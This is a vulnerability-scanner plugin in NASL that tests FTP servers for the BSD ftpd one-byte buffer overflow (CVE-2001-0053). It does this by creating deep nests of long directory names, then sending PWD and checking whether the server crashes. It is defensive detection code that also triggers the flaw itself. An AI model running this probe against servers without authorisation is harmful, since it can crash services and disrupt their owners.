if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.11371" );
	script_version( "2020-08-24T08:40:10+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 08:40:10 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_bugtraq_id( 2124 );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_cve_id( "CVE-2001-0053" );
	script_name( "BSD ftpd Single Byte Buffer Overflow" );
	script_category( ACT_DESTRUCTIVE_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "FTP" );
	script_copyright( "Copyright (C) 2003 Xue Yong Zhi" );
	script_dependencies( "ftpserver_detect_type_nd_version.sc", "ftp_writeable_directories.sc" );
	script_require_ports( "Services/ftp", 21 );
	script_mandatory_keys( "ftp/login", "ftp/writeable_dir" );
	script_tag( name: "solution", value: "Upgrade your FTP server.

  Consider removing directories writable by 'anonymous'." );
	script_tag( name: "summary", value: "One-byte buffer overflow in replydirname function
  in BSD-based ftpd allows remote attackers to gain root privileges." );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("ftp_func.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
port = ftp_get_port( default: 21 );
func on_exit(  ){
	soc = open_sock_tcp( port );
	if(soc){
		ftp_log_in( socket: soc, user: login, pass: pass );
		send( socket: soc, data: NASLString( "CWD ", wri, "\\r\\n" ) );
		r = ftp_recv_line( socket: soc );
		for(j = 0;j < num_dirs - 1;j++){
			send( socket: soc, data: NASLString( "CWD ", crap( 144 ), "\\r\\n" ) );
			r = ftp_recv_line( socket: soc );
		}
		for(j = 0;j < num_dirs;j++){
			send( socket: soc, data: NASLString( "RMD ", crap( 144 ), "\\r\\n" ) );
			r = ftp_recv_line( socket: soc );
			if(!ereg( pattern: "^250 .*", string: r )){
				exit( 0 );
			}
			send( socket: soc, data: NASLString( "CWD ..\\r\\n" ) );
			r = ftp_recv_line( socket: soc );
		}
	}
}
kb_creds = ftp_get_kb_creds();
login = kb_creds["login"];
pass = kb_creds["pass"];
if(!login){
	exit( 0 );
}
wri = get_kb_item( "ftp/writeable_dir" );
if(!wri){
	exit( 0 );
}
soc = open_sock_tcp( port );
if(!soc){
	exit( 0 );
}
if(!ftp_log_in( socket: soc, user: login, pass: pass )){
	ftp_close( socket: soc );
	exit( 0 );
}
num_dirs = 0;
c = NASLString( "CWD ", wri, "\\r\\n" );
send( socket: soc, data: c );
b = ftp_recv_line( socket: soc );
cwd = NASLString( "CWD ", crap( 144 ), "\\r\\n" );
mkd = NASLString( "MKD ", crap( 144 ), "\\r\\n" );
rmd = NASLString( "RMD ", crap( 144 ), "\\r\\n" );
pwd = NASLString( "PWD \\r\\n" );
for(i = 0;i < 20;i = i + 1){
	send( socket: soc, data: mkd );
	b = ftp_recv_line( socket: soc );
	if(!b){
		exit( 0 );
	}
	if( !ereg( pattern: "^257 .*", string: b ) ){
		i = 20;
	}
	else {
		send( socket: soc, data: cwd );
		b = ftp_recv_line( socket: soc );
		send( socket: soc, data: rmd );
		if(!b){
			exit( 0 );
		}
		if( !ereg( pattern: "^250 .*", string: b ) ){
			i = 20;
		}
		else {
			num_dirs++;
		}
	}
}
send( socket: soc, data: pwd );
b = ftp_recv_line( socket: soc );
if(!b){
	security_message( port: port );
	exit( 0 );
}
ftp_close( socket: soc );

